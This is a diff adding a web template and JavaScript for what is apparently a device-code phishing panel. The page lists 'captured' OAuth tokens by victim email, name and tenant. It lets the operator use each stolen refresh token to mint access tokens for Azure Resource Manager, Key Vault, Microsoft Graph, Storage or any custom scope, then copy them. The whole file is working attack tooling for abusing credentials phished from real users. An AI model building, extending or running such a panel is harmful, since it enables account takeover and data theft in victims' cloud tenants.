@@ -1,0 +1,302 @@
+{% extends "base.html" %}
+{% block title %}Captured Tokens - Device Code Phishing{% endblock %}
+{% block content %}
+<p class="mb-2">Tokens captured when users complete the device code login. Use refresh token to get an access token anytime.</p>
+<div class="card">
+    <table>
+        <thead>
+            <tr>
+                <th>User / Email</th>
+                <th>Display name</th>
+                <th>Tenant</th>
+                <th>Captured</th>
+                <th>Actions</th>
+            </tr>
+        </thead>
+        <tbody>
+            {% for t in tokens %}
+            <tr>
+                <td>{{ t.user_email or t.user_id or '-' }}</td>
+                <td>{{ t.user_display_name or '-' }}</td>
+                <td>{{ t.tenant_id or '-' }}</td>
+                <td>{{ t.created_at.strftime('%Y-%m-%d %H:%M') if t.created_at else '-' }}</td>
+                <td>
+                    <button type="button" class="btn btn-sm btn-primary get-access-token" data-id="{{ t.id }}">Get access token</button>
+                    <form action="{{ url_for('main.token_delete', id=t.id) }}" method="post" style="display:inline;" class="token-delete-form">
+                        <button type="submit" class="btn btn-sm btn-danger">Delete</button>
+                    </form>
+                </td>
+            </tr>
+            {% else %}
+            <tr><td colspan="5">No captured tokens yet. Run a campaign and wait for users to complete device login.</td></tr>
+            {% endfor %}
+        </tbody>
+    </table>
+    </div>
+</div>
+
+<!-- Overlay + token popup (with always-visible scope dropdown) -->
+<div id="token-popup-overlay" class="popup-overlay" style="display:none;" aria-hidden="true"></div>
+<div id="token-modal" class="popup-box" style="display:none; max-width: 900px; width: 90%;">
+    <h2>Access token</h2>
+    <input type="hidden" id="scope-token-id" value="">
+    <div class="mb-2" style="display:flex; gap:0.75rem; align-items:flex-start;">
+        <div style="flex: 1;">
+            <label for="scope-select" class="block mb-1">Scope</label>
+            <select id="scope-select" class="block" style="width: 100%; padding: 0.4rem;">
+                <option value="https://management.azure.com/.default">ARM (Azure Resource Manager)</option>
+                <option value="https://vault.azure.net/.default">Key Vault</option>
+                <option value="https://graph.microsoft.com/.default">Microsoft Graph</option>
+                <option value="https://storage.azure.com/.default">Storage</option>
+            </select>
+        </div>
+        <div style="flex: 1; position: relative;">
+            <label for="scope-custom" class="block mb-1">Custom scope (optional)</label>
+            <div style="display:flex; gap:0.5rem;">
+                <input id="scope-custom" type="text" placeholder="e.g. https://graph.microsoft.com/.default" style="width: 100%; padding: 0.4rem;">
+                <button type="button" class="btn btn-sm" id="resource-picker-toggle">Browse</button>
+            </div>
+            <p class="label-hint" style="margin-top: 0.25rem; font-size: 0.8rem;">If provided, this value overrides the dropdown selection.</p>
+            {% if resources %}
+            <div id="resource-picker" class="card" style="position:absolute; right:0; top:100%; margin-top:0.25rem; max-height:420px; width:800px; overflow:auto; display:none; z-index:20;">
+                <div style="padding:0.25rem 0.25rem 0.5rem 0.25rem;">
+                    <input id="resource-search" type="text" placeholder="Search by name, app ID, or permission ID..." style="width: 100%; padding: 0.35rem; font-size: 0.85rem; margin-bottom:0.35rem;">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th style="width:40%;">Name</th>
+                                <th style="width:35%;">App ID (base)</th>
+                                <th style="width:25%;">Permission ID</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% for r in resources %}
+                            <tr class="resource-row" data-app-id="{{ r.appId }}" data-name="{{ r.name|e }}" data-pid="{{ r.p_id|e }}" style="cursor:pointer;">
+                                <td>{{ r.name }}</td>
+                                <td><code>{{ r.appId }}</code></td>
+                                <td><code>{{ r.p_id }}</code></td>
+                            </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            {% endif %}
+        </div>
+    </div>
+    <div style="display:flex; gap:0.5rem; margin-top:0.5rem; margin-bottom:0.5rem;">
+        <button type="button" class="btn btn-primary" id="scope-modal-get-token">Get access token</button>
+        <button type="button" class="btn" id="close-token-modal">Close</button>
+    </div>
+    <div style="display:flex; align-items:center; justify-content:space-between; gap:0.75rem; margin-bottom:0.25rem;">
+        <p id="token-scope-label" class="mb-1" style="font-size: 0.85rem; color: #666; margin:0;"></p>
+        <button type="button" class="btn btn-sm" id="copy-token-btn" style="display:none;">Copy token</button>
+    </div>
+    <pre id="token-output" style="word-break: break-all; white-space: pre-wrap; font-size: 0.85rem; max-height: 300px; overflow: auto;"></pre>
+</div>
+{% endblock %}
+{% block scripts %}
+<script>
+(function () {
+    var overlay = document.getElementById('token-popup-overlay');
+    var tokenModal = document.getElementById('token-modal');
+    var scopeTokenId = document.getElementById('scope-token-id');
+    var scopeSelect = document.getElementById('scope-select');
+    var tokenOutput = document.getElementById('token-output');
+    var tokenScopeLabel = document.getElementById('token-scope-label');
+    var resourcePickerToggle = document.getElementById('resource-picker-toggle');
+    var resourcePicker = document.getElementById('resource-picker');
+    var scopeCustomInput = document.getElementById('scope-custom');
+    var copyBtn = document.getElementById('copy-token-btn');
+
+    function showOverlay() {
+        if (overlay) {
+            overlay.style.display = 'block';
+            overlay.setAttribute('aria-hidden', 'false');
+        }
+    }
+
+    function hideOverlay() {
+        if (overlay) {
+            overlay.style.display = 'none';
+            overlay.setAttribute('aria-hidden', 'true');
+        }
+    }
+
+    function openTokenModal(id) {
+        scopeTokenId.value = id;
+        if (scopeSelect) {
+            scopeSelect.selectedIndex = 0; // default to first predefined scope
+        }
+        if (scopeCustomInput) scopeCustomInput.value = '';
+        tokenOutput.textContent = '';
+        tokenOutput.style.color = '';
+        tokenScopeLabel.textContent = '';
+        if (copyBtn) {
+            copyBtn.style.display = 'none';
+            copyBtn.textContent = 'Copy token';
+        }
+        showOverlay();
+        tokenModal.style.display = 'block';
+    }
+
+    function closeTokenModal() {
+        tokenModal.style.display = 'none';
+        hideOverlay();
+    }
+
+    function requestToken(id, scope, scopeLabel) {
+        if (!id) return;
+        showOverlay();
+        tokenOutput.textContent = 'Requesting...';
+        tokenOutput.style.color = '';
+        tokenScopeLabel.textContent = scopeLabel ? 'Scope: ' + scopeLabel : '';
+        tokenModal.style.display = 'block';
+
+        var body = scope ? JSON.stringify({ scope: scope }) : {};
+        var opts = { method: 'POST', headers: { 'Content-Type': 'application/json' } };
+        if (body) opts.body = body;
+
+        fetch('/api/tokens/' + id + '/access-token', opts)
+            .then(function (r) { return r.json(); })
+            .then(function (d) {
+                if (d.ok) {
+                    tokenOutput.textContent = d.access_token || '(no token)';
+                    tokenOutput.style.color = '';
+                    if (copyBtn && d.access_token) {
+                        copyBtn.style.display = 'inline-block';
+                    } else if (copyBtn) {
+                        copyBtn.style.display = 'none';
+                    }
+                } else {
+                    tokenOutput.textContent = 'Error: ' + (d.error || 'Unknown');
+                    tokenOutput.style.color = '#c00';
+                    if (copyBtn) copyBtn.style.display = 'none';
+                }
+            })
+            .catch(function () {
+                tokenOutput.textContent = 'Request failed';
+                tokenOutput.style.color = '#c00';
+                if (copyBtn) copyBtn.style.display = 'none';
+            });
+    }
+
+    document.querySelectorAll('.get-access-token').forEach(function (btn) {
+        btn.addEventListener('click', function () {
+            openTokenModal(this.getAttribute('data-id'));
+        });
+    });
+
+    if (resourcePickerToggle && resourcePicker) {
+        resourcePickerToggle.addEventListener('click', function () {
+            if (resourcePicker.style.display === 'none' || !resourcePicker.style.display) {
+                resourcePicker.style.display = 'block';
+            } else {
+                resourcePicker.style.display = 'none';
+            }
+        });
+
+        var resourceSearch = document.getElementById('resource-search');
+        if (resourceSearch) {
+            resourceSearch.addEventListener('input', function () {
+                var q = (this.value || '').toLowerCase();
+                var rows = resourcePicker.querySelectorAll('.resource-row');
+                rows.forEach(function (row) {
+                    var name = (row.getAttribute('data-name') || '').toLowerCase();
+                    var appId = (row.getAttribute('data-app-id') || '').toLowerCase();
+                    var pid = (row.getAttribute('data-pid') || '').toLowerCase();
+                    if (!q || name.indexOf(q) !== -1 || appId.indexOf(q) !== -1 || pid.indexOf(q) !== -1) {
+                        row.style.display = '';
+                    } else {
+                        row.style.display = 'none';
+                    }
+                });
+            });
+        }
+
+        resourcePicker.addEventListener('click', function (e) {
+            var row = e.target.closest('.resource-row');
+            if (!row) return;
+            var appId = row.getAttribute('data-app-id');
+            if (!appId || !scopeCustomInput) return;
+            // Use appId as base and append /.default as requested.
+            scopeCustomInput.value = appId + '/.default';
+            resourcePicker.style.display = 'none';
+        });
+    }
+
+    document.getElementById('scope-modal-get-token').addEventListener('click', function () {
+        var id = scopeTokenId.value;
+        if (!id) return;
+        var customScopeInput = document.getElementById('scope-custom');
+        var customScope = customScopeInput && customScopeInput.value.trim() ? customScopeInput.value.trim() : null;
+        var dropdownScope = scopeSelect.value || null;
+        var scope = customScope || dropdownScope;
+        var scopeLabel;
+        if (customScope) {
+            scopeLabel = 'Custom: ' + customScope;
+        } else {
+            scopeLabel = scopeSelect.options[scopeSelect.selectedIndex].text;
+        }
+        requestToken(id, scope, scopeLabel);
+    });
+
+    document.getElementById('close-token-modal').addEventListener('click', closeTokenModal);
+
+    if (copyBtn) {
+        copyBtn.addEventListener('click', function () {
+            var text = tokenOutput.textContent || '';
+            if (!text) return;
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(text).then(function () {
+                    copyBtn.textContent = 'Copied';
+                    setTimeout(function () { copyBtn.textContent = 'Copy token'; }, 1500);
+                }).catch(function () {});
+            } else {
+                // Fallback: select the text in the <pre>
+                var range = document.createRange();
+                range.selectNodeContents(tokenOutput);
+                var sel = window.getSelection();
+                sel.removeAllRanges();
+                sel.addRange(range);
+                try {
+                    document.execCommand('copy');
+                    copyBtn.textContent = 'Copied';
+                    setTimeout(function () { copyBtn.textContent = 'Copy token'; }, 1500);
+                } catch (e) {
+                    // ignore
+                }
+                sel.removeAllRanges();
+            }
+        });
+    }
+
+    if (overlay) {
+        overlay.addEventListener('click', function (e) {
+            if (e.target === overlay) {
+                closeTokenModal();
+            }
+        });
+    }
+})();
+
+// Styled confirm popup for deleting captured tokens, reusing global helper if available
+(function () {
+    var forms = document.querySelectorAll('.token-delete-form');
+    if (!forms.length) return;
+
+    forms.forEach(function (form) {
+        form.addEventListener('submit', function (e) {
+            e.preventDefault();
+            var msg = 'Delete this captured token? This cannot be undone.';
+            function doDelete() {
+                form.submit();
+            }
+            if (window._dc_openConfirm) {
+                window._dc_openConfirm(msg, doDelete);
+            }
+        });
+    });
+})();
+</script>
+{% endblock %}
